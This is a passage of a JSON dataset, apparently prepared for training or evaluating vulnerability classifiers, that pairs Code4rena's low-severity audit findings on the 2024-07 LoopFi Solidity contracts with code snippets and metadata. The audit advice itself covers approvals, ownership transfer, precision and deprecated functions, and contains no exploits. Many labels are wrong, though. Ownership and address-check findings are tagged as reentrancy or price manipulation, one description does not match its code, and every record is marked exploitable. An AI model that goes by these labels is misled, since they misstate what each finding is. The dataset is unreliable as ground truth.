    "description": "- Some tokens (like the *very popular* USDT) do not work when changing the allowance from an existing non-zero allowance value (it will revert if the current approval is not zero to protect against front-running changes of approvals). These tokens must first be approved for zero and then the actual allowance can be approved. - Furthermore, OZ's implementation of safeApprove would throw an error if an approve is attempted from a non-zero value (`\"SafeERC20: approve from non-zero to non-zero allowance\"`) Set the allowance to zero immediately before each of the existing allowance calls *Instances (3)*: File: src/vendor/AuraVault.sol",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-07-loopfi",
    "audit_source": "code4rena",
    "lines_of_code": 10,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.232,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nFile: src/reward/ChefIncentivesController.sol\n\n20: contract ChefIncentivesController is Initializable, PausableUpgradeable, OwnableUpgradeable, RecoverERC20 {\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "reentrancy",
    "severity": "Low",
    "title": "<a name=\"L-2\"></a>[L-2] Use a 2-step ownership transfer pattern",
    "description": "Recommend considering implementing a two step process where the owner or admin nominates an account and the nominated account needs to call an `acceptOwnership()` function for the transfer of ownership to fully succeed. This ensures the nominated EOA account is a valid and active account. Lack of two-step procedure for critical operations leaves them error-prone. Consider adding two step procedure on the critical functions. *Instances (3)*: File: src/StakingLPEth.sol 8: contract StakingLPEth is ERC4626, Ownable, ReentrancyGuard { [Link to code](https://github.com/code-423n4/2024-07-loopfi/blob/main/src/StakingLPEth.sol)",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-07-loopfi",
    "audit_source": "code4rena",
    "lines_of_code": 6,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.169,
    "vulnerability_types": [
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nFile: src/CDPVault.sol\n\n410:             poolUnderlying.safeTransferFrom(creditor, address(pool), amount);\n\n439:             token.safeTransferFrom(collateralizer, address(this), amount);\n\n442:             token.safeTransfer(collateralizer, amount);\n\n539:         poolUnderlying.safeTransferFrom(msg.sender, address(pool), repayAmount - penalty);\n\n565:         token.safeTransfer(msg.sender, takeCollateral);\n\n568:         poolUnderlying.safeTransferFrom(msg.sender, address(pool), penalty);\n\n610:         poolUnderlying.safeTransferFrom(msg.sender, address(pool), repayAmount);\n\n626:         token.safeTransfer(msg.sender, takeCollateral);\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Low",
    "title": "<a name=\"L-3\"></a>[L-3] Some tokens may revert when zero value transfers are made",
    "description": "Example: <https://github.com/d-xo/weird-erc20#revert-on-zero-value-transfers>. In spite of the fact that EIP-20 [states](https://github.com/ethereum/EIPs/blob/46b9b698815abbfa628cd1097311deee77dd45c5/EIPS/eip-20.md?plain=1#L116) that zero-valued transfers must be accepted, some tokens, such as LEND will revert if this is attempted, which may cause transactions that involve other tokens (such as batch operations) to fully revert. Consider skipping the transfer if the amount is zero, which will also save gas. *Instances (36)*: File: src/CDPVault.sol 410:             poolUnderlying.safeTransferFrom(creditor, address(pool), amount);",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-07-loopfi",
    "audit_source": "code4rena",
    "lines_of_code": 20,
    "has_external_calls": true,
    "has_state_changes": false,
    "complexity_score": 0.651,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nFile: src/PoolV3.sol\n\n168:         addressProvider = addressProvider_; // U:[LP-1B]\n\n169:         underlyingToken = underlyingToken_; // U:[LP-1B]\n\n179:         interestRateModel = interestRateModel_; // U:[LP-1B]\n\n754:         interestRateModel = newInterestRateModel; // U:[LP-22B]\n\n773:         poolQuotaKeeper = newPoolQuotaKeeper; // U:[LP-23D]\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "price_manipulation",
    "severity": "Low",
    "title": "<a name=\"L-4\"></a>[L-4] Missing checks for `address(0)` when assigning values to address state variables",
    "description": "*Instances (15)*: File: src/PoolV3.sol 168:         addressProvider = addressProvider_; // U:[LP-1B] 169:         underlyingToken = underlyingToken_; // U:[LP-1B] 179:         interestRateModel = interestRateModel_; // U:[LP-1B]",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-07-loopfi",
    "audit_source": "code4rena",
    "lines_of_code": 14,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.36,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      1,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "solidity\nFile: src/PoolV3.sol\n\n182:         if (ERC20(underlyingToken_).decimals() != 18) {\n\n193:         return ERC4626.decimals();\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Low",
    "title": "<a name=\"L-5\"></a>[L-5] `decimals()` is not a part of the ERC-20 standard",
    "description": "The `decimals()` function is not a part of the [ERC-20 standard](https://eips.ethereum.org/EIPS/eip-20), and was added later as an [optional extension](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/extensions/IERC20Metadata.sol). As such, some valid ERC20 tokens do not support this interface, so it is unsafe to blindly cast all tokens to this interface, and then call this function. *Instances (2)*: File: src/PoolV3.sol 182:         if (ERC20(underlyingToken_).decimals() != 18) { 193:         return ERC4626.decimals();",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-07-loopfi",
    "audit_source": "code4rena",
    "lines_of_code": 8,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.134,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nFile: src/vendor/AuraVault.sol\n\n204:         IERC20(asset()).safeApprove(rewardPool, assets);\n\n221:         IERC20(asset()).safeApprove(rewardPool, assets);\n\n293:         IERC20(asset()).safeApprove(rewardPool, amountIn);\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Low",
    "title": "<a name=\"L-6\"></a>[L-6] Do not use deprecated library functions",
    "description": "*Instances (5)*: File: src/VaultRegistry.sol 33:         _setupRole(DEFAULT_ADMIN_ROLE, msg.sender); 34:         _setupRole(VAULT_MANAGER_ROLE, msg.sender); [Link to code](https://github.com/code-423n4/2024-07-loopfi/blob/main/src/VaultRegistry.sol)",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-07-loopfi",
    "audit_source": "code4rena",
    "lines_of_code": 10,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.232,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nFile: src/vendor/AuraVault.sol\n\n204:         IERC20(asset()).safeApprove(rewardPool, assets);\n\n221:         IERC20(asset()).safeApprove(rewardPool, assets);\n\n293:         IERC20(asset()).safeApprove(rewardPool, amountIn);\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Low",
    "title": "<a name=\"L-7\"></a>[L-7] `safeApprove()` is deprecated",
    "description": "[Deprecated](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/bfff03c0d2a59bcd8e2ead1da9aed9edf0080d05/contracts/token/ERC20/utils/SafeERC20.sol#L38-L45) in favor of `safeIncreaseAllowance()` and `safeDecreaseAllowance()`. If only setting the initial allowance to the value that means infinite, `safeIncreaseAllowance()` can be used instead. The function may currently work, but if a bug is found in this version of OpenZeppelin, and the version that you're forced to upgrade to no longer has this function, you'll encounter unnecessary delays in porting and testing replacement contracts. *Instances (3)*: File: src/vendor/AuraVault.sol 204:         IERC20(asset()).safeApprove(rewardPool, assets); 221:         IERC20(asset()).safeApprove(rewardPool, assets);",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-07-loopfi",
    "audit_source": "code4rena",
    "lines_of_code": 10,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.232,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "solidity\nFile: src/VaultRegistry.sol\n\n33:         _setupRole(DEFAULT_ADMIN_ROLE, msg.sender);\n\n34:         _setupRole(VAULT_MANAGER_ROLE, msg.sender);\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Low",
    "title": "<a name=\"L-8\"></a>[L-8] Deprecated _setupRole() function",
    "description": "*Instances (2)*: File: src/VaultRegistry.sol 33:         _setupRole(DEFAULT_ADMIN_ROLE, msg.sender); 34:         _setupRole(VAULT_MANAGER_ROLE, msg.sender); [Link to code](https://github.com/code-423n4/2024-07-loopfi/blob/main/src/VaultRegistry.sol)",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-07-loopfi",
    "audit_source": "code4rena",
    "lines_of_code": 8,
    "has_external_calls": true,
    "has_state_changes": false,
    "complexity_score": 0.152,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "\n\nSources:\n\n- <https://docs.openzeppelin.com/contracts/4.x/api/proxy#Initializable-_disableInitializers-->\n- <https://twitter.com/0xCygaar/status/1621417995905167360?s=20>\n\n*Instances (1)*:\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Low",
    "title": "<a name=\"L-9\"></a>[L-9] Do not leave an implementation contract uninitialized",
    "description": "An uninitialized implementation contract can be taken over by an attacker, which may impact the proxy. To prevent the implementation contract from being used, it's advisable to invoke the `_disableInitializers` function in the constructor to automatically lock it when it is deployed. This should look similar to this: /// @custom:oz-upgrades-unsafe-allow constructor constructor() { _disableInitializers(); }",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-07-loopfi",
    "audit_source": "code4rena",
    "lines_of_code": 10,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.191,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nFile: src/reward/MultiFeeDistribution.sol\n\n568:                     requiredAmount = (remaining * WHOLE) / (WHOLE - penaltyFactor);\n\n1040:             rptStored = rptStored + ((newReward * 1e18) / lockedSupplyWithMultiplier);\n\n1200:             r.rewardPerSecond = (reward * 1e12) / rewardsDuration;\n\n1204:             r.rewardPerSecond = ((reward + leftover) * 1e12) / rewardsDuration;\n\n1463:             penaltyFactor = ((earning.unlockTime - block.timestamp) * HALF) / vestDuration + QUART; // 25% + timeLeft/vestDuration * 65%\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "integer_overflow",
    "severity": "Low",
    "title": "<a name=\"L-10\"></a>[L-10] Division by zero not prevented",
    "description": "The divisions below take an input parameter which does not have any zero-value checks, which may lead to the functions reverting when zero is passed. *Instances (14)*: File: src/CDPVault.sol 723:         return (amount * cumulativeIndexNow) / cumulativeIndexLastUpdate - amount; [Link to code](https://github.com/code-423n4/2024-07-loopfi/blob/main/src/CDPVault.sol)",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-07-loopfi",
    "audit_source": "code4rena",
    "lines_of_code": 14,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.541,
    "vulnerability_types": [
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nFile: src/proxy/PositionAction.sol\n\n279:                 (bool success, bytes memory response) = targets[i].call(data[i]);\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "reentrancy",
    "severity": "Low",
    "title": "<a name=\"L-11\"></a>[L-11] External calls in an un-bounded `for-`loop may result in a DOS",
    "description": "Consider limiting the number of iterations in for-loops that make external calls *Instances (2)*: File: src/proxy/PositionAction.sol 279:                 (bool success, bytes memory response) = targets[i].call(data[i]); [Link to code](https://github.com/code-423n4/2024-07-loopfi/blob/main/src/proxy/PositionAction.sol)",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-07-loopfi",
    "audit_source": "code4rena",
    "lines_of_code": 6,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.133,
    "vulnerability_types": [
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nFile: src/proxy/PositionAction.sol\n\n279:                 (bool success, bytes memory response) = targets[i].call(data[i]);\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "reentrancy",
    "severity": "Low",
    "title": "<a name=\"L-12\"></a>[L-12] External call recipient may consume all transaction gas",
    "description": "There is no limit specified on the amount of gas used, so the recipient can use up all of the transaction's gas, causing it to revert. Use `addr.call{gas: <amount>}(\"\")` or [this](https://github.com/nomad-xyz/ExcessivelySafeCall) library instead. *Instances (1)*: File: src/proxy/PositionAction.sol 279:                 (bool success, bytes memory response) = targets[i].call(data[i]); [Link to code](https://github.com/code-423n4/2024-07-loopfi/blob/main/src/proxy/PositionAction.sol)",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-07-loopfi",
    "audit_source": "code4rena",
    "lines_of_code": 6,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.133,
    "vulnerability_types": [
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nFile: src/oracle/BalancerOracle.sol\n\n74:     ) initializer {\n\n98:     function initialize(address admin, address manager) external initializer {\n\n100:         __AccessControl_init();\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "price_manipulation",
    "severity": "Low",
    "title": "<a name=\"L-13\"></a>[L-13] Initializers could be front-run",
    "description": "Initializers could be front-run, allowing an attacker to either set their own values, take ownership of the contract, and in the best case forcing a re-deployment *Instances (16)*: File: src/oracle/BalancerOracle.sol 74:     ) initializer { 98:     function initialize(address admin, address manager) external initializer {",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-07-loopfi",
    "audit_source": "code4rena",
    "lines_of_code": 10,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.193,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      1,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "solidity\nFile: src/reward/MultiFeeDistribution.sol\n\n620:         if (unlockTime <= block.timestamp) revert InvalidTime();\n\n917:             if (locks[i].unlockTime > block.timestamp) {\n\n1231:         if (periodFinish < block.timestamp + rewardsDuration - rewardsLookback) {\n\n1319:             while (i < length && locks[i].unlockTime <= block.timestamp) {\n\n1461:         if (earning.unlockTime > block.timestamp) {\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Low",
    "title": "<a name=\"L-14\"></a>[L-14] Signature use at deadlines should be allowed",
    "description": "According to [EIP-2612](https://github.com/ethereum/EIPs/blob/71dc97318013bf2ac572ab63fab530ac9ef419ca/EIPS/eip-2612.md?plain=1#L58), signatures used on exactly the deadline timestamp are supposed to be allowed. While the signature may or may not be used for the exact EIP-2612 use case (transfer approvals), for consistency's sake, all deadlines should follow this semantic. If the timestamp is an expiration rather than a deadline, consider whether it makes more sense to include the expiration timestamp as a valid timestamp, as is done for deadlines. *Instances (7)*: File: src/reward/ChefIncentivesController.sol 410:                 if (_startTimeOffsets[i] < block.timestamp - startTime) revert InvalidStart(); 873:         if (endingTime.lastUpdatedTime + endingTime.updateCadence > block.timestamp) {",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-07-loopfi",
    "audit_source": "code4rena",
    "lines_of_code": 14,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.416,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nFile: src/reward/MultiFeeDistribution.sol\n\n610:         _withdrawTokens(_address, amount, penaltyAmount, burnAmount, false);\n\n639:         _withdrawTokens(onBehalfOf, amount, penaltyAmount, burnAmount, claimRewards);\n\n657:         _withdrawTokens(onBehalfOf, amount, penaltyAmount, burnAmount, claimRewards);\n\n1288:                 rdntToken.safeTransfer(starfleetTreasury, burnAmount);\n\n1290:             rdntToken.safeTransfer(daoTreasury, penaltyAmount - burnAmount);\n\n1300:         emit Withdrawn(onBehalfOf, amount, _balances[onBehalfOf].locked, penaltyAmount, burnAmount, false);\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Low",
    "title": "<a name=\"L-15\"></a>[L-15] Prevent accidentally burning tokens",
    "description": "Minting and burning tokens to address(0) prevention *Instances (12)*: File: src/PoolV3.sol 283:         assets = mint(shares, receiver); // U:[LP-2A,2B,5,7] 393:         _mint(receiver, shares); // U:[LP-6,7]",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-07-loopfi",
    "audit_source": "code4rena",
    "lines_of_code": 16,
    "has_external_calls": true,
    "has_state_changes": false,
    "complexity_score": 0.596,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nFile: src/reward/ChefIncentivesController.sol\n\n966:     function pause() external onlyOwner {\n\n973:     function unpause() external onlyOwner {\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "access_control",
    "severity": "Low",
    "title": "<a name=\"L-16\"></a>[L-16] Owner can renounce while system is paused",
    "description": "The contract owner or single user with a role is not prevented from renouncing the role/ownership while the contract is paused, which would cause any user assets stored in the protocol, to be locked indefinitely. *Instances (4)*: File: src/reward/ChefIncentivesController.sol 966:     function pause() external onlyOwner { 973:     function unpause() external onlyOwner {",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-07-loopfi",
    "audit_source": "code4rena",
    "lines_of_code": 8,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.154,
    "vulnerability_types": [
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nFile: src/reward/ChefIncentivesController.sol\n\n995:             newReward = (rawReward * pool.allocPoint) / _totalAllocPoint;\n\n996:             newAccRewardPerShare = (newReward * ACC_REWARD_PRECISION) / lpSupply;\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Low",
    "title": "<a name=\"L-17\"></a>[L-17] Possible rounding issue",
    "description": "Division by large numbers may result in the result being zero, due to solidity not supporting fractions. Consider requiring a minimum amount for the numerator to ensure that it is always larger than the denominator. Also, there is indication of multiplication and division without the use of parenthesis which could result in issues. *Instances (5)*: File: src/quotas/GaugeV3.sol 115:                     : uint16((uint256(qrp.minRate) * votesCaSide + uint256(qrp.maxRate) * votesLpSide) / totalVotes); // U:[GA-15] [Link to code](https://github.com/code-423n4/2024-07-loopfi/blob/main/src/quotas/GaugeV3.sol)",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-07-loopfi",
    "audit_source": "code4rena",
    "lines_of_code": 8,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.224,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "solidity\nFile: src/reward/MultiFeeDistribution.sol\n\n568:                     requiredAmount = (remaining * WHOLE) / (WHOLE - penaltyFactor);\n\n572:                     newPenaltyAmount = (requiredAmount * penaltyFactor) / WHOLE;\n\n573:                     newBurnAmount = (newPenaltyAmount * burn) / WHOLE;\n\n1102:         uint256 lockDurationWeeks = _lockPeriod[typeIndex] / AGGREGATION_EPOCH;\n\n1109:                 (userLocks[indexToAggregate].unlockTime / AGGREGATION_EPOCH == unlockTime / AGGREGATION_EPOCH) &&\n\n1191:             uint256 opExAmount = (reward * operationExpenseRatio_) / RATIO_DIVISOR;\n\n1463:             penaltyFactor = ((earning.unlockTime - block.timestamp) * HALF) / vestDuration + QUART; // 25% + timeLeft/vestDuration * 65%\n\n1464:             penaltyAmount = (earning.amount * penaltyFactor) / WHOLE;\n\n1465:             burnAmount = (penaltyAmount * burn) / WHOLE;\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Low",
    "title": "<a name=\"L-18\"></a>[L-18] Loss of precision",
    "description": "Division by large numbers may result in the result being zero, due to solidity not supporting fractions. Consider requiring a minimum amount for the numerator to ensure that it is always larger than the denominator *Instances (37)*: File: src/PoolV3.sol 672:         return (_totalDebt.borrowed * baseInterestRate().calcLinearGrowth(timestamp)) / RAY; 677:         return (_baseInterestIndexLU * (RAY + baseInterestRate().calcLinearGrowth(timestamp))) / RAY;",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-07-loopfi",
    "audit_source": "code4rena",
    "lines_of_code": 22,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.89,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "\n\n[Link to code](https://github.com/code-423n4/2024-07-loopfi/blob/main/src/reward/ChefIncentivesController.sol)\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "price_manipulation",
    "severity": "Medium",
    "title": "<a name=\"L-19\"></a>[L-19] Solidity version 0.8.20+ may not work on other chains due to `PUSH0`",
    "description": "The compiler for Solidity 0.8.20 switches the default target EVM version to [Shanghai](https://blog.soliditylang.org/2023/05/10/solidity-0.8.20-release-announcement/#important-note), which includes the new `PUSH0` op code. This op code may not yet be implemented on all L2s, so deployment on these chains will fail. To work around this issue, use an earlier [EVM](https://docs.soliditylang.org/en/v0.8.20/using-the-compiler.html?ref=zaryabs.com#setting-the-evm-version-to-target) [version](https://book.getfoundry.sh/reference/config/solidity-compiler#evm_version). While the project itself may or may not compile with 0.8.20, other projects with which it integrates, or which extend this project may, and those projects will have problems deploying these contracts/libraries. *Instances (22)*: File: src/Flashlender.sol 2: pragma solidity ^0.8.19; [Link to code](https://github.com/code-423n4/2024-07-loopfi/blob/main/src/Flashlender.sol)",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-07-loopfi",
    "audit_source": "code4rena",
    "lines_of_code": 5,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.114,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      1,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "solidity\n      function acceptOwnership() external {\n          address sender = _msgSender();\n          require(pendingOwner() == sender, \"Ownable2Step: caller is not the new owner\");\n          _transferOwnership(sender);\n      }\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Low",
    "title": "<a name=\"L-20\"></a>[L-20] Use `Ownable2Step.transferOwnership` instead of `Ownable.transferOwnership`",
    "description": "Use [Ownable2Step.transferOwnership](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/access/Ownable2Step.sol) which is safer. Use it as it is more secure due to 2-stage ownership transfer. **Recommended Mitigation Steps** Use <a href=\"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/access/Ownable2Step.sol\">Ownable2Step.sol</a> function acceptOwnership() external { address sender = _msgSender();",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-07-loopfi",
    "audit_source": "code4rena",
    "lines_of_code": 7,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.23,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nFile: src/Silo.sol\n\n2: pragma solidity ^0.8.0;\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Low",
    "title": "<a name=\"L-21\"></a>[L-21] File allows a version of solidity that is susceptible to an assembly optimizer bug",
    "description": "In solidity versions 0.8.13 and 0.8.14, there is an [optimizer bug](https://github.com/ethereum/solidity-blog/blob/499ab8abc19391be7b7b34f88953a067029a5b45/_posts/2022-06-15-inline-assembly-memory-side-effects-bug.md) where, if the use of a variable is in a separate `assembly` block from the block in which it was stored, the `mstore` operation is optimized out, leading to uninitialized memory. The code currently does not have such a pattern of execution, but it does use `mstore`s in `assembly` blocks, so it is a risk for future changes. The affected solidity versions should be avoided if at all possible. *Instances (1)*: File: src/Silo.sol 2: pragma solidity ^0.8.0; [Link to code](https://github.com/code-423n4/2024-07-loopfi/blob/main/src/Silo.sol)",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-07-loopfi",
    "audit_source": "code4rena",
    "lines_of_code": 6,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.057,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "solidity\nFile: src/reward/ChefIncentivesController.sol\n\n10: import {RecoverERC20} from \"./RecoverERC20.sol\";\n\n20: contract ChefIncentivesController is Initializable, PausableUpgradeable, OwnableUpgradeable, RecoverERC20 {\n\n430:     function recoverERC20(address tokenAddress, uint256 tokenAmount) external onlyOwner {\n\n431:         _recoverERC20(tokenAddress, tokenAmount);\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "access_control",
    "severity": "Low",
    "title": "<a name=\"L-22\"></a>[L-22] Sweeping may break accounting if tokens with multiple addresses are used",
    "description": "There have been [cases](https://blog.openzeppelin.com/compound-tusd-integration-issue-retrospective/) in the past where a token mistakenly had two addresses that could control its balance, and transfers using one address impacted the balance of the other. To protect against this potential scenario, sweep functions should ensure that the balance of the non-sweepable token does not change after the transfer of the swept tokens. *Instances (10)*: File: src/reward/ChefIncentivesController.sol 10: import {RecoverERC20} from \"./RecoverERC20.sol\"; 20: contract ChefIncentivesController is Initializable, PausableUpgradeable, OwnableUpgradeable, RecoverERC20 {",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-07-loopfi",
    "audit_source": "code4rena",
    "lines_of_code": 12,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.375,
    "vulnerability_types": [
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nFile: src/CDPVault.sol\n\n196:         if (parameter == \"debtFloor\") vaultConfig.debtFloor = uint128(data);\n\n197:         else if (parameter == \"liquidationRatio\") vaultConfig.liquidationRatio = uint64(data);\n\n198:         else if (parameter == \"liquidationPenalty\") liquidationConfig.liquidationPenalty = uint64(data);\n\n199:         else if (parameter == \"liquidationDiscount\") liquidationConfig.liquidationDiscount = uint64(data);\n\n489:             uint96(cdd.debt),\n\n679:                 newCumulativeQuotaInterest = uint128(cumulativeQuotaInterest - quotaInterestPaid); // U:[CL-3]\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "integer_overflow",
    "severity": "Low",
    "title": "<a name=\"L-23\"></a>[L-23] Consider using OpenZeppelin's SafeCast library to prevent unexpected overflows when downcasting",
    "description": "Downcasting from `uint256`/`int256` in Solidity does not revert on overflow. This can result in undesired exploitation or bugs, since developers usually assume that overflows raise errors. [OpenZeppelin's SafeCast library](https://docs.openzeppelin.com/contracts/3.x/api/utils#SafeCast) restores this intuition by reverting the transaction when such an operation overflows. Using this library eliminates an entire class of bugs, so it's recommended to use it always. Some exceptions are acceptable like with the classic `uint256(uint160(address(variable)))` *Instances (17)*: File: src/CDPVault.sol 196:         if (parameter == \"debtFloor\") vaultConfig.debtFloor = uint128(data); 197:         else if (parameter == \"liquidationRatio\") vaultConfig.liquidationRatio = uint64(data);",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-07-loopfi",
    "audit_source": "code4rena",
    "lines_of_code": 16,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.594,
    "vulnerability_types": [
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nFile: src/Flashlender.sol\n\n105:         underlyingToken.transferFrom(address(receiver), address(pool), total);\n\n133:         underlyingToken.transferFrom(address(receiver), address(pool), total);\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Low",
    "title": "<a name=\"L-24\"></a>[L-24] Unsafe ERC20 operation(s)",
